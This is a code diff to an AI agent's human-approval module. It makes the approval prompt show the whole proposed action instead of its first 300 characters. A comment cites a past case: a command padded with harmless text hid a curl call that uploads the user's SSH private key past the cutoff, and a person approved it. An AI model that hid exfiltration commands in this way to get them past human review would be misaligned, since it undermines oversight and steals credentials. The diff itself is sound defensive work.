@@ -25,6 +25,7 @@ from collections.abc import Callable
 from dataclasses import dataclass, field
 from typing import Any, Protocol
 
+from chimera.governance.pending import shown_action
 from chimera.telemetry import get_logger
 
 _log = get_logger("governance.approval")
@@ -228,7 +229,8 @@ def ask(
         try:
             print(f"\n[governance] {reason or 'review required'}", file=out)
             if action:
-                print(f"  action: {visible(action if whole_action else action[:300])}", file=out)
+                shown = action if whole_action else shown_action(action)
+                print(f"  action: {visible(shown)}", file=out)
             print("  allow this once? [y/N] ", end="", file=out, flush=True)
             answer = input().strip().lower()
         except (EOFError, OSError, KeyboardInterrupt):
@@ -385,12 +387,19 @@ def approver_for(
         return deny(ledger)
     if ask_with is not None:
         return ask_via(ask_with, ledger)
+    # The WHOLE action on both, never its first 300 characters (study 30, S30-04 review). Since a
+    # crew approval answers the whole proposal (`shared_approval.py`), what the person is shown must
+    # be the whole proposal too: `crew-isolated` asks through here, and a command whose tail came
+    # after character 300 — `echo xxx… && curl -d @~/.ssh/id_rsa …` — was approved by someone who
+    # saw the harmless opening and a note that there was more. A note is not a reading.
     if nobody_is_at_a_terminal():
         if home is not None:
-            return ask_elsewhere(home, ledger, deliver=deliver, wait_seconds=wait_seconds)
+            return ask_elsewhere(
+                home, ledger, deliver=deliver, wait_seconds=wait_seconds, whole_action=True
+            )
         _log.info("approval mode 'ask' with no terminal: denying and recording")
         return deny(ledger)
-    return ask(ledger)
+    return ask(ledger, whole_action=True)
 
 
 def ask_elsewhere(
